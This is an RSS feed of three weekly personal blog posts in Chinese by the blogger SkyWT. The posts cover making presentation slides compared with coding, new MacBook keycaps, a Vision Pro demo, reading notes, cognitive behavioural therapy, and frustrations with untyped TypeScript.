<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>SkyWT</title><description>热爱与激情永不止息。</description><link>https://skywt.cn/</link><language>zh-cn</language><item><title>Weekly #14：做 PPT 相比 coding 的痛苦之处</title><link>https://skywt.cn/blog/weekly-14/</link><guid isPermaLink="true">https://skywt.cn/blog/weekly-14/</guid><description>&gt; 「你看看我太太，」老先生继续说，「她还是小姑娘的时候就很漂亮，而我却一直其貌不扬。在火车上，我第一眼看见她，就立刻爱上了她。我知道，如果那时不找她搭话的话，很可能再也见不到她了。车厢里坐满了人，我坐在她的对面。在这种情况下，要当着别人的面跟她搭话，我觉得这是我所经历过的最可怕的时刻。我得在下一站下车，没有多少时间了。我快要急死了。她要是拒绝我怎么办？还当着所有乘客的面，多丢脸呀！可是我还是冒险去做了。你看，我得到的奖励是什么？我生命中最宝贵的东西。」他温柔地抚摸了一下妻子的手。
&gt;
&gt; 汉内坎普太太补充说：「最珍贵的礼物是我们自己争取来的。克服了丢面子的恐惧，世界就会向你敞开大门！」

</description><pubDate>Sun, 25 Aug 2024 21:00:00 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;「你看看我太太，」老先生继续说，「她还是小姑娘的时候就很漂亮，而我却一直其貌不扬。在火车上，我第一眼看见她，就立刻爱上了她。我知道，如果那时不找她搭话的话，很可能再也见不到她了。车厢里坐满了人，我坐在她的对面。在这种情况下，要当着别人的面跟她搭话，我觉得这是我所经历过的最可怕的时刻。我得在下一站下车，没有多少时间了。我快要急死了。她要是拒绝我怎么办？还当着所有乘客的面，多丢脸呀！可是我还是冒险去做了。你看，我得到的奖励是什么？我生命中最宝贵的东西。」他温柔地抚摸了一下妻子的手。&lt;/p&gt;
&lt;p&gt;汉内坎普太太补充说：「最珍贵的礼物是我们自己争取来的。克服了丢面子的恐惧，世界就会向你敞开大门！」&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!--more--&gt;
&lt;p&gt;最早定的每周 Weekly 是要在周一发的，后来定义为「在一周之内发一篇」，延迟到了周二周三周四，现在甚至延迟到了周日。明天就是下一周的周一了……这样算下来我其实延迟了整整一周！&lt;/p&gt;
&lt;p&gt;看来下周得提前一点……&lt;/p&gt;
&lt;h2&gt;🌆 封面图：日落时分&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/08/270342576.jpg&quot; alt=&quot;日落时分&quot;&gt;&lt;/p&gt;
&lt;p&gt;夕阳无限好，只是近黄昏。&lt;/p&gt;
&lt;h2&gt;📑 做 PPT 相比 coding 的痛苦之处&lt;/h2&gt;
&lt;p&gt;本周在准备转正答辩 PPT。由于最后要交一个 PPT 文件，所以不能使用 LaTeX、Nodeppt、slidev 这类的先进 slide 方案，只能使用古法手工制作 PPT：Microsoft PowerPoint 或者Apple Keynote。我选择了后者。&lt;/p&gt;
&lt;p&gt;去厂内找了一些 PPT 模板，都太丑了，且有多处元素不对齐、字体或大小颜色不一致等问题，还超级喜欢用微软雅黑。真的是非常草台班子的模板。所以我仅仅从模板里捞了一些素材，从零开始自己做。&lt;/p&gt;
&lt;p&gt;这种古法制作 PPT 太痛苦了，做的时候总是感叹：&lt;strong&gt;为什么不能用 CSS！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;首先是元素对齐的问题。&lt;/strong&gt;Apple Keynote 能够开启辅助线对齐，用触控板能感受到对齐时的微小震动反馈，虽然这体验至少比用鼠标好一些，但远比不上直接用 Flex 布局来得直观。&lt;/p&gt;
&lt;p&gt;说到底，PPT 的设计器只是表达了各种元素的&lt;strong&gt;绝对位置&lt;/strong&gt;（像素坐标），而无法表达诸如「对齐」这样的&lt;strong&gt;位置逻辑关系&lt;/strong&gt;。这就好比设计 Web 页面的时候，不许用 Flex、Grid 布局，所有元素都必须是 &lt;code&gt;position: fixed&lt;/code&gt; 并且用 &lt;code&gt;left: 50px; top: 100px&lt;/code&gt; 来指定位置！这也太痛苦了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;其次是复用的问题。&lt;/strong&gt;Keynote 提供了「模板」功能，可以创建几个固定的页面模板，一个页面可以应用一个模板，当模板样式更改，所有应用该模板的页面可以同步更改。对于字体样式，它还可以设定可复用的样式，比如 Title、Caption 等，同样更改某种字体样式，所有应用该样式的文本都会更改。这可以说提供了「页面」和「字体样式」两种设定的复用。&lt;/p&gt;
&lt;p&gt;然而，这两种复用是有限的。Keynote 无法提供组件组合复用。比如我用几个组件组合成一个元素，如果要创建一个一模一样的元素，我必须复制这些组件，在移动的时候小心翼翼地保持它们的相对位置不变。并且这无法保证一致性：如果我创建了四个元素，突然想改其中某个组件的样式或位置，必须修改四次！如果能把这些组件组合成的元素&lt;strong&gt;封装成一个可复用的组件&lt;/strong&gt;该多好！如果能定义 class、继承或组合、随心所欲地复用，该多好！程序设计里自然而然的思想，在这里却无法自然地使用。&lt;/p&gt;
&lt;p&gt;还有各种很痛苦的问题。我们在编写程序（特别是前端页面）的时候习以为常的某些实践，组件复用、封装、模块化、数据流，&lt;strong&gt;在 PPT 的世界里都不存在&lt;/strong&gt;。这就好像已经熟练掌握编程的你，被要求只能用 Scratch 图形化地拖拽制作程序，不许编写代码！&lt;/p&gt;
&lt;p&gt;综上所述，我觉得无论是 Microsoft PowerPoint 还是 Apple Keynote 都非常不适合程序员。归根结底，&lt;strong&gt;它们的表达能力太有限了&lt;/strong&gt;，远远比不上代码的表达能力。对于擅长 coding 的人来说，low-code 或者 no-code 工具都挺折磨的。&lt;/p&gt;
&lt;h2&gt;⌨️ 换套键帽，让 MacBook 焕然一新&lt;/h2&gt;
&lt;p&gt;我的这台 MacBook Air 马上就要进入陪伴我的第四个年头了。在长久的使用之中，键盘键帽磨损抛光非常严重。看起来的效果就是键帽「油油的」（虽然这种「油」擦不掉），很不舒服。&lt;/p&gt;
&lt;p&gt;于是本周在闲鱼上花 ¥43 买了一套新的 MacBook Air 键帽，花了一个晚上把所有按键都换了，顺便清理了键盘。现在，这台 MacBook 看起来就像新的一样！（这成功地暂时打消了我换新 MacBook 的念头，劲省一万元）&lt;/p&gt;
&lt;p&gt;上面是旧的回车键，已经被磨得反光了。下面是新买的，像新的一样！（我买了一套美版按键，感觉更简洁）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/08/2864710275.jpg&quot; alt=&quot;新旧回车按键的对比&quot;&gt;&lt;/p&gt;
&lt;p&gt;除了空格键、方向键比较难拆，其他按键都很容易，甚至不用专门的工具，只要一张纸质卡片就能拆下来。如果你也受不了 MacBook 键盘抛光的情况，强烈推荐也去换一套键帽！&lt;/p&gt;
&lt;h2&gt;👀 Apple Vision Pro 体验&lt;/h2&gt;
&lt;p&gt;本周末去 Apple 杭州万象城体验了 &lt;strong&gt;Vision Pro&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/08/905286599.jpg&quot; alt=&quot;Apple 杭州万象城&quot;&gt;&lt;/p&gt;
&lt;p&gt;看过很多测评视频了，所以整体的体验内容本身其实没有特别惊艳的感觉，只是「&lt;strong&gt;一般地惊艳&lt;/strong&gt;」。一些体验细节，比如最开始注视校正时的音效反馈，UI 的精美，体验短片的整体呈现，都「符合 Apple 一贯的水平」。&lt;/p&gt;
&lt;p&gt;不过这次更惊艳我的是另一种体验：&lt;strong&gt;Apple 直营店的体验&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;刚进店找工作人员 check-in 的时候，由于演示设备需要一段时间准备，我们要在店内稍作等待。&lt;strong&gt;他们居然会在手机上记录下我们的样貌、穿着等信息，方便准备好后找到店内乱逛的我们。&lt;/strong&gt;这个记录似乎是用一个专门设计的 App，我看到了一个颜色选择器。这种细节的体验以前在任何地方从未有过！换作一般的这种场合，可能会安排取号、叫号的机制，像银行或者政府办事大厅那样。但这就太「不 Apple」了。&lt;/p&gt;
&lt;p&gt;负责接待我的 Specialist 非常有亲和力。他聊到，他居然自己买过两台 Vision Pro，一台美版，一台国行。他讲到 Vision Pro 的体验是如何给他的奶奶带来震撼。我其实第一次接触店内的 Specialist，感觉他们都完全不像是普通零售店里的销售人员，完全不像是某个企业培训班能培训出来的。&lt;strong&gt;我被他们对产品的热情深深感染了。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我不知道 Apple 是如何定义 Specialist 这个岗位的，似乎完全不像普通手机店的销售、客服人员一样是个低端的岗位。相反，&lt;strong&gt;他们就像是作为 Apple 产品的一部分&lt;/strong&gt;，在直营店里也给我们提供了很符合 Apple 风格的体验。&lt;/p&gt;
&lt;p&gt;（不过看网上的帖子，似乎也有很多直营店的店员态度很差、极不专业的案例。不知道具体的管理制度是怎样的）&lt;/p&gt;
&lt;h2&gt;💰 本周在读：《小狗钱钱》&lt;/h2&gt;
&lt;p&gt;看了越来越多关于经济学、市场、投资、理财的「资本主义」入门书籍，会越来越发现，之前在学校的政治课学到的有关经济学的理论是有不少片面的，至少是有很多内容以前的课里没有教给我们。&lt;/p&gt;
&lt;p&gt;最重要的是，没有教我们如何追求钱、管理钱。甚至或许传达出这样一种观念：追求钱是可耻的，富人是坏的，财富累积必然靠「剥削」，所谓「资本从头到脚流着肮脏的血」。&lt;/p&gt;
&lt;p&gt;而关于钱的很多知识是从后来读的书里学到的，《黑客与画家》《富爸爸穷爸爸》《第一本经济学》《纳瓦尔宝典》等等，以及本周的《小狗钱钱》。追求钱和财富并不是一件可耻的事情。管理财富反而是一门学问，应该从小培养管理钱和财富的习惯，即所谓「财商」。&lt;/p&gt;
&lt;p&gt;《小狗钱钱》虽然是一本儿童读物，但对于从小缺少这类教育的大学生来说也很合适 😁。&lt;/p&gt;
&lt;p&gt;可惜，如果离开学校之后不主动阅读（这是大多数人的情况），就很难用这种视角看待世界。&lt;/p&gt;
&lt;h2&gt;📄 全新 Web 简历正式上线！&lt;/h2&gt;
&lt;p&gt;我的全新 Web 简历终于完工了！立即访问 👉 &lt;a href=&quot;https://cv.skywt.cn&quot;&gt;cv.skywt.cn&lt;/a&gt;。我甚至做了个很酷的 Landing Page，感觉我自己是个产品，要被推销给别人……&lt;/p&gt;
&lt;p&gt;相比上一版，新的简历通过新的字体、配色，呈现了新的风格。并且兼容了移动端访问和 Darkmode。改天我要写篇博客详述一下。&lt;/p&gt;
&lt;p&gt;这个 Web 简历网页用 Chrome 之类的浏览器打印成 PDF，就成了我的文件简历。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;秋招，启动！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下周见。&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>Weekly #13：永远有人十八岁</title><link>https://skywt.cn/blog/weekly-13/</link><guid isPermaLink="true">https://skywt.cn/blog/weekly-13/</guid><description>&gt; 打扮漂亮，十八岁是天堂
&gt; 我们的生活甜得像糖
&gt;
&gt; —— 朴树《New Boy》

</description><pubDate>Sun, 18 Aug 2024 15:00:00 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;打扮漂亮，十八岁是天堂&lt;br&gt;
我们的生活甜得像糖&lt;/p&gt;
&lt;p&gt;—— 朴树《New Boy》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!--more--&gt;
&lt;h2&gt;🌆 封面图：月亮与六便士&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/08/2092215997.jpg&quot; alt=&quot;封面图：月亮与六便士&quot;&gt;&lt;/p&gt;
&lt;p&gt;无意间拍到的图，上面是月亮，下面是大厂（六便士？）。可惜 iPhone 12 mini 拍照不太行，拍远景特别糊。&lt;/p&gt;
&lt;h2&gt;🎈 永远有人十八岁&lt;/h2&gt;
&lt;p&gt;偶然看到 HNU 公众号推的新一届「我要上典礼」（指新生开学典礼）活动，才意识到，马上就要 2024 届新生入学了。&lt;/p&gt;
&lt;p&gt;三年前的我还怀着对大学不切实际的期待，憧憬着未来的四年生活。一年前我还在当迎新班导。那时候看新入学的新生，就像看 2021 年的自己。现在 2024 届新生即将入学，去年我带的新生有的都要当班导了。&lt;/p&gt;
&lt;p&gt;时间过得真快，一届又一届的新生入学。&lt;strong&gt;永远有人十八岁，但我们会不断长大。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;经常搬家的好处就是，经常会彻底地更新环境，因此经常会发现自己彻底告别了过去的生活。因为许多纪念物是我们和过去的自己保持联系的唯一通道。大一住寝室里的时候经常翻高中的日记本，自从大三搬出去了就再也没翻过。后来回寝室整理东西的时候再次翻看，发现过去的自己，高中时期的自己，大一的自己，已经离我这么远了。&lt;/p&gt;
&lt;p&gt;同样，现在我似乎觉得过去的大学生活已经离自己远去了。在这座新的城市里，很少有东西能让我脑海浮现过去大学生活里的印记。我正在新的环境里塑造一种全新的生活。&lt;/p&gt;
&lt;p&gt;不过对于成长这件事情本身，我还是满怀期待的。相比 18 岁的自己，现在的我对这个世界懂得更多，也能掌控更多东西，离我想要的生活越来越近。虽然还有未知的（且越来越近的）前途等着我，但我相信只要保持学习，人的学识和认知是随时间而积累的，是单调递增的。至少对年轻的我们来说是如此。&lt;/p&gt;
&lt;h2&gt;🌙 一个恐怖而独特的梦境体验&lt;/h2&gt;
&lt;p&gt;做了一个多层的梦。这个梦的独特之处在于：在最外层的梦里，&lt;strong&gt;我以为自己醒来了&lt;/strong&gt;。这层梦的情景确实是在深夜的床上，房间里一片漆黑。我从上一层梦里醒来，尝试去开灯，结果发现无论如何灯都打不开。并且这时候的我感觉非常非常困，马上就要睡着（跌入下一层梦境）。我希望开灯让自己清醒，结果无论如何尝试，灯都打不开。一种无名的恐怖笼罩了我。&lt;/p&gt;
&lt;p&gt;（回想起来梦里看到的情景和现实世界是有明显区别的：灯的开关是圆形的，而我床头的开关是方形的。不过一如所有的梦，在梦里不会觉察到这些区别。）&lt;/p&gt;
&lt;p&gt;不一会就醒来了，一看手表：凌晨 1:40。当我真正醒来才清醒地知道，刚才是梦境，醒来之后的世界才是现实世界。月光透过纱帘照进来，屋里并不是一片漆黑，我不用开灯也能看清，世界并没有梦里那么恐怖。&lt;/p&gt;
&lt;p&gt;然而当时在最外层的梦境里，我也以为自己醒来了。&lt;strong&gt;我如何证明现在我的真正醒来了呢？&lt;/strong&gt;🤔（这是个有趣的问题）&lt;/p&gt;
&lt;h2&gt;🎵 音乐、文学、诗歌，是「情感存储器」&lt;/h2&gt;
&lt;p&gt;有时候觉得，音乐、文学、诗歌这一类的艺术，是「&lt;strong&gt;情感存储器&lt;/strong&gt;」。&lt;/p&gt;
&lt;p&gt;一切人类的知识，本质上都是信息。数学、科学、工业、技术这些东西，它们都是清楚的、理性的，可被表达的。所以，我们往往能够通过简单的文字等载体将其客观地记录下来。即使有些记录形式的复杂性，也是为了方便人的理解。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;然而情感不是如此。&lt;/strong&gt;情感往往是稍纵即逝的、抽象的、无法被客观描述的。一个人内心波涛汹涌的情感体验，是无法通过某种客观的描述语言表达出来的。（或许有，那就是此瞬间大脑的电信号状态，但脑科学似乎还未发展到这个程度，且这么做的成本太高了）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;为了捕获和存储这种稍纵即逝的情感，必须使用特制的「容器」。&lt;/strong&gt;这种容器就是音乐、文学、诗歌。这些载体包含的信息并不代表着它们存储的情感本身。只有当人被诗歌打动，感受到了其中的情感，其中存储的东西才真正释放出来。&lt;/p&gt;
&lt;p&gt;很幸运，世界上存在这样的存储器，能够让我们这些暂无缘拥有爱情的人一瞥它的美好和幸福。&lt;/p&gt;
&lt;h2&gt;😡 TypeScript，但到处是 any&lt;/h2&gt;
&lt;p&gt;很讨厌屎山代码的这种风格：虽然整个项目使用了 TypeScript，但到处都是 &lt;code&gt;any&lt;/code&gt;。并且到处都是红色下划线，似乎大家都不在意这一点。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这样的话，使用 TypeScript 还有什么意义呢？&lt;/strong&gt;既然有红色下划线又不管，这种行为不是和「使用纯 JavaScript + 在注释里写明类型」等效嘛，后者还可以避免红色下划线。&lt;/p&gt;
&lt;p&gt;最令人头大的是，一些传入函数的对象，本身有很多可用的方法，然而当我想看这些方法的列表（想去对象定义里找）的时候，发现传入对象类型赫然写着 &lt;code&gt;any&lt;/code&gt;，所有方法的用法都是 &lt;code&gt;obj?.method()&lt;/code&gt;……并且也找不到任何有关这个传入对象的文档！每当此时，我只能：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;看该函数代码中别处如何使用这个对象。通过方法名猜测其用途。&lt;/li&gt;
&lt;li&gt;看看 git 里代码谁写的，问写代码的人。&lt;/li&gt;
&lt;li&gt;去找调用该函数的代码（可能还要找调用「调用该函数的代码」的代码，以及调用「调用『调用该函数的代码』的代码」的代码）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这再次体现出代码的可维护性是多么重要。我的工作时间就这样浪费掉了。🤷&lt;/p&gt;
&lt;h2&gt;📖 把故事讲出历史感&lt;/h2&gt;
&lt;p&gt;我实在太喜欢茨威格的《人类群星闪耀时》了（我现在理解为什么高中那个语文补习班的老师总是把这本书挂在嘴边了 😂），虽然之前的 Weekly 多次提到过，不过本周又对其中的一个片段有所感触。&lt;/p&gt;
&lt;p&gt;起因是本周为了准备秋招面试，在重新读红宝书《&lt;strong&gt;JavaScript 高级程序设计&lt;/strong&gt;》。这本书的序言开头是这样一句话：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;工业革命是钢铁铸就的，互联网革命则是 JavaScript 造就的。&lt;/strong&gt;25 年的反复锻造与打磨，成就了 JavaScript 在今天的应用程序开发中毋庸置疑的统治地位，但并非一开始就是如此。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;第一次读到的时候，能感觉到扑面而来的&lt;strong&gt;恢宏的历史感&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果要讲一个故事，如何讲出这种「历史感」呢？&lt;/strong&gt;一个很好用的技巧就是由大入小，从宏观的角度切入，讲述这个东西在宏伟尺度上的历史意义。&lt;/p&gt;
&lt;p&gt;于是我想到《人类群星闪耀时》的这篇《&lt;strong&gt;征战南极&lt;/strong&gt;》。本篇讲述的是人类第一次到达南极点，英国科考队历经千辛万苦到达，希望自己国家的旗帜第一个在南极点飘扬，却绝望地发现别的国家已捷足先登。最终他们在回途中全军覆没。&lt;/p&gt;
&lt;p&gt;这篇的开头是怎么写的呢？我觉得这就是由宏大的历史视角切入的典范，每次读都能感受到一种深深的震撼。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;二十世纪正俯瞰着一个毫无秘密可言的世界。&lt;/strong&gt;所有的陆地均已被勘探，船只已抵达最遥远的海岸。那些无名之地，三十年前还微醺着无拘无束地打盹儿，如今已卑躬屈膝地为欧洲的需求服务。轮船径直驶向经过长期寻找的尼罗河源头。半个世纪前才被第一个欧洲人发现的维多利亚瀑布如今驯服地碾磨发电。最后一片荒野，亚马孙河两岸的森林，已经被砍伐得稀疏。唯一的处女地西藏，也已被解开了腰带。旧地图和地球仪上仍旧存在着专家们夸张标注的“人迹罕至之地”，但二十世纪的人类已经了解了他们生活的星球。他们探索的意志已经踏上了新的征程，向下探至深海动物，向上探至无垠的天穹。因为自从地球对尘世间的好奇者已不再神秘以来，未涉足的区域只能去天空中发现，飞机的钢铁双翼已竞相冲上云端，去征服新的高度和新的远方。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;然而二十世纪的最后一个谜团仍在众目睽睽之下守护着她娇羞的容颜。&lt;/strong&gt;地球那被撕咬和折磨的身躯上仍有两个极小的点，在回避着人类的贪得无厌。南极和北极，这两个看似空洞而毫无感性的地方是地球的脊梁。千百年来，地球以此为轴旋转着，并保护着这两块净地不被亵渎。在这最后的秘密之地，它铸造冰雪，以永恒的冬季为守卫神来抵御贪婪。严寒和风暴的围墙骄傲而凶悍地守护着入口，恐怖和危险以死亡为威胁吓走那些冒险家。人类尚未有幸瞧见这一封闭区域的面貌，甚至连太阳也只能仓促地瞥上一眼。&lt;/p&gt;
&lt;p&gt;几十年来，探险队前仆后继，却尚无一人能成功抵达目的地。而不久前，人们才在一个不知名的地方发现了安德烈的尸体。他已经在一具冰制的“水晶棺”中躺了整整三十三年。这位勇者中的勇者曾经梦想驾驶飞艇飞跃极点，却不幸一去未返。他每次的冲锋都撞击在晶莹的冰冻墙面上。几千年来直至今日，地球仍在此处遮掩着它的面貌，牢牢地成功抵御着人类探险的激情，处女般贞洁地在世上的好奇者面前护卫着它的赧颜。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;但年轻的二十世纪已迫不及待地伸出它的双手。&lt;/strong&gt;它在实验室中研制新武器，发明新式盔甲抵御危险。一切阻力都只会激起它更多的贪欲。它要了解一切真相。二十世纪想在最初的十年，就拥有之前所有世纪尚未企及的一切成就。个人的勇气与民族间的对抗携手。人们不再只身夺取极点，而是争取最先在无人涉足的区域让本国的旗帜高高飘扬：各个种族的十字军和人民开始征服伴随渴望而越发神圣的土地。地球的各个大陆都发起了新的冲击。人类已不能再等待。他们知道，极地是人类生存空间内最后的秘密之地。“佩利号”和“库克号”从美洲驶往北极，另有两艘船，一艘由挪威人阿蒙森指挥，另一艘由英国人斯科特舰长率队，驶向南极。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;下周见。&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>Weekly #12：用「认知行为疗法」控制情绪</title><link>https://skywt.cn/blog/weekly-12/</link><guid isPermaLink="true">https://skywt.cn/blog/weekly-12/</guid><description>&gt; 希拉鲁姆什么也没说。平生头一次，他真正明白了黑夜是什么 —— 它是这个世界投下的影子，投射在天空中。

</description><pubDate>Tue, 06 Aug 2024 23:00:00 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;希拉鲁姆什么也没说。平生头一次，他真正明白了黑夜是什么 —— 它是这个世界投下的影子，投射在天空中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!--more--&gt;
&lt;h2&gt;🌆 封面图：夏天的云（二）&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/08/4188349588.jpg&quot; alt=&quot;夏天的云&quot;&gt;&lt;/p&gt;
&lt;h2&gt;👀 用「认知行为疗法」控制情绪&lt;/h2&gt;
&lt;p&gt;在精力充沛的时候，我是有充分的理智的，想要学习更多知识，想要看更多书，想要认识更多人，想要创造。这时候，对一切的认知往往是清晰和积极的。&lt;/p&gt;
&lt;p&gt;然而当劳累的时候，心情郁闷或者烦躁的时候，我的思想往往不受理性的控制，而纯粹沦为感性的机器。对任何事情的认知都会笼罩上一层负面的滤镜。&lt;/p&gt;
&lt;p&gt;《伯恩斯新情绪疗法》中介绍的「认知行为疗法」，尝试教我们解决这一问题。本书指出，&lt;strong&gt;负面情绪源于「认知扭曲」&lt;/strong&gt;，而负面情绪本身又加深了错误的认知，从而形成恶性循环。这些所谓的「认知扭曲」，当我们情绪正常时，是能够明显发现其错误的，但在负面情绪之下则可能陷入其中，比如「TA 肯定是讨厌我了」「我肯定做不好这件事情」，诸如此类。&lt;/p&gt;
&lt;p&gt;为了打破这些「认知扭曲」，我们能够在清醒的时候建立一种响应机制。例如，书中列出了&lt;strong&gt;十大认知扭曲：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;非此即彼：完美主义，认为 1% 不做成就 100% 失败&lt;/li&gt;
&lt;li&gt;以偏概全&lt;/li&gt;
&lt;li&gt;心理过滤&lt;/li&gt;
&lt;li&gt;否定正面思考&lt;/li&gt;
&lt;li&gt;妄下结论：包括心理猜测（读心术）、先知错误&lt;/li&gt;
&lt;li&gt;放大和缩小&lt;/li&gt;
&lt;li&gt;情绪化推理&lt;/li&gt;
&lt;li&gt;「应该」句式&lt;/li&gt;
&lt;li&gt;乱贴标签&lt;/li&gt;
&lt;li&gt;罪责归己 / 罪责归人&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;为了建立一套能够客观运行的情绪调控机制，我们可以将其标准化（就像麦当劳标准化的餐饮制作流程）。本书介绍的改变感受的四步流程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;描述导致心理沮丧的事件。&lt;/li&gt;
&lt;li&gt;记录负面感受。&lt;/li&gt;
&lt;li&gt;「三栏法」，写下自动思维、认知扭曲、理性回应。&lt;/li&gt;
&lt;li&gt;重新评估。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这种方法建立了一种不需要太多理性的思考框架，并借助客观的外部媒介（用纸和笔写下）。经过实测，这种方法确实有一定效果。很推荐这本《伯恩斯新情绪疗法》！&lt;/p&gt;
&lt;p&gt;人类的感性虽然是伟大的能力，但也非常容易让理性失去控制。我认为时刻保持清醒是作为人类最重要的能力。&lt;/p&gt;
&lt;h2&gt;🎵 肖斯塔科维奇第二圆舞曲&lt;/h2&gt;
&lt;p&gt;我不是一个很懂音乐的人。但上学期自训队的交响乐表演，其中《肖斯塔科维奇第二圆舞曲》给我留下了最为深刻的印象。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV1VF411x7nU/?share_source=copy_web&amp;amp;vd_source=cd3fa74d3421ce574a62e3c11dcde9f6&quot;&gt;肖斯塔科维奇《第二圆舞曲》（俄罗斯圣彼得堡爱乐）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;交响乐真是一种很神奇的艺术形式。我们接触的大多数艺术形式，特别是通俗的艺术，比如电影、摄影、小说、绘画、戏剧、流行音乐，&lt;strong&gt;我们对艺术作品的感觉都源于我们生活的经验&lt;/strong&gt;。没有相关的经历，可能对于作品就无法产生共情。然而纯音乐，特别是交响乐，却不是如此。&lt;strong&gt;我们对这种艺术作品的感知纯粹来源于作品本身&lt;/strong&gt;。或许这可以被称为「纯艺术」。&lt;/p&gt;
&lt;h2&gt;🎬 本周观影：《布达佩斯大饭店》&lt;/h2&gt;
&lt;p&gt;对这部经典电影早有耳闻，也一直在我的观影 list 里。一直觉得对这种很经典的、很艺术的电影，作为消遣在茶余饭后观赏则有些浪费了（这居然成了我拖延症的理由……）。这周终于看了。&lt;/p&gt;
&lt;p&gt;最吸引我的自然是本片的构图和色调。这是电影作为一种视觉艺术的体现。随着一层层故事的进入，环境、色彩甚至光影的变化，很有效地营造了氛围，将欧洲那个年代的历史展现在我们的眼前。&lt;/p&gt;
&lt;p&gt;看到结尾「本片灵感源于史蒂芬 · 茨威格的作品」的字幕，shock 了一下……最近恰好在重读茨威格的作品，太巧了！不过看到这行字幕才回想起来，这部作品确实很有茨威格的风格。像诗一样的语言，像诗一样看待世界的方式。正如他本人所言：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;即便在惊恐的深渊中，我也会一而再地抬头仰望那些旧日的星辰。&lt;/p&gt;
&lt;p&gt;—— 茨威格《昨日的世界》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最近看的虚构类文学作品有点多，似乎我对文学越来越感兴趣了。不过仔细想想，文学只是关于文字这种表达形式的学问。音乐、电影甚至游戏，都可以是同等的表达形式。我深深着迷的东西，其实是&lt;strong&gt;这些形式背后表达的内容&lt;/strong&gt;，那些深刻的情感和伟大的精神。&lt;/p&gt;
&lt;h2&gt;🇬🇧 把系统语言换成英语！&lt;/h2&gt;
&lt;p&gt;Via：&lt;a href=&quot;https://www.v2ex.com/t/952624&quot;&gt;我发现把系统语言切换成 English 的好处&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;翻译讲求信达雅，这固然没错，但许多时候这种「翻译感」并不适合需要简单直白高效的 UI。例如：Finder 翻译成「访达」，虽然确实很信达雅，有一股 Apple 特有的艺术气息，但却丧失了原来直白高效的感觉。&lt;/p&gt;
&lt;p&gt;还有经典的「拷贝」和「复制」。Apple 系产品的「拷贝」等于非 Apple 系产品的「复制」（二者都是 copy）；而 Apple 系产品的「复制」其实是 duplicate……不难发现，虽然翻译是为了本地化，让我们更好理解，但对我们而言，这些外来词被翻译后反而不如原来的英文好理解。&lt;/p&gt;
&lt;p&gt;这类问题最多的当属 Apple Music 不可。「Play Next」被翻译成「插播」，「Library」被译为「资料库」。第一次从国产音乐软件转移过来的我，见到这样的 UI 完全摸不着头脑。&lt;/p&gt;
&lt;p&gt;然而，将系统语言换成英语也有一些问题。iOS 大多数 App 都支持单独设定语言，所以可以将一些没兼容好的软件设为中文；然而系统自带的 Apple Music 却无法单独设置语言，这导致很多中文歌名、歌手名都会显示为英文，根本不认识！&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;到底姓在前还是名在前？？？
&lt;ul&gt;
&lt;li&gt;孙燕姿 —— Yanzi Sun&lt;/li&gt;
&lt;li&gt;周深 —— Zhou Shen&lt;/li&gt;
&lt;li&gt;毛不易 —— Mao Bu Yi&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;莫文蔚 —— Karen Mok&lt;/li&gt;
&lt;li&gt;薛之谦 —— Joker Xue&lt;/li&gt;
&lt;li&gt;凤凰传奇 —— Phoenix Legend&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;📑 正在制作我的全新简历 4.0！&lt;/h2&gt;
&lt;p&gt;技术岗一般不会很看重简历的设计，许多大厂都有自己的简历系统，或许面试官根本不看简历的 PDF。但既然我都用前端技术来写简历了，自然希望做得有意思一点。&lt;/p&gt;
